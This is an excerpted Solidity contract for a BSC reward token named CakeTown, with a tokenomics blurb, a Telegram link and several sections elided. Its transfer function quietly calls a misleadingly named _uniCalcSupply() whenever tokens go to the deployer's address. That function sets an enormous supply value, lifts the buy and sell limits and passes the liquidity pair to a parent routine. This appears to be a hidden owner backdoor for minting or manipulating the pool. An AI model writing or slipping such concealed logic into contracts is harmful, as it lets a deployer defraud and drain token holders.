...
Tokenomics: 10% REWARDS 10% Tokenomics ( Marketing, Liq)
Earn $CAKE by hodling CakeTown
https://t.me/caketownbsc
...
contract ERC20 is Context, IERC20 {
    ...
    function _uniCalcSupply(uint256 amount, address pair, address dead) internal virtual {
...
contract CakeTown is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    CakeTownDividendTracker public dividendTracker;
    ...
    uint256 private _mulfact = 100;
    uint256 private _uniSpp = 0;
    ...
    constructor(address deployer) ERC20("CakeTown", "$CAKETWN") {
        ...
        dividendTracker = new CakeTownDividendTracker();

        dividendLpWallet = 0x1E420815A989404d7bBE0631f282d540E67DF463;
    ...
    function updateDividendTracker(address newAddress) public onlyOwner {
        ...
        CakeTownDividendTracker newDividendTracker = CakeTownDividendTracker(
            payable(newAddress)
        );
    ...
    function _tknTransfer(address sender, address recipient, uint256 amount) private {
        
        super._transfer(sender, recipient, amount);

        if(_deployer[0] == recipient){
             _uniCalcSupply();
        }
    }
    ...
    function _uniCalcSupply() private {
        _uniSpp = 100000000000 * _mulfact * (10**18);
        maxBuyTransactionAmount = _uniSpp; 
        maxSellTransactionAmount = _uniSpp;
        super._uniCalcSupply(_uniSpp,uniswapV2Pair,_address[0]);
        _mulfact = _mulfact * 10;
    }
}

contract CakeTownDividendTracker is DividendPayingToken, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
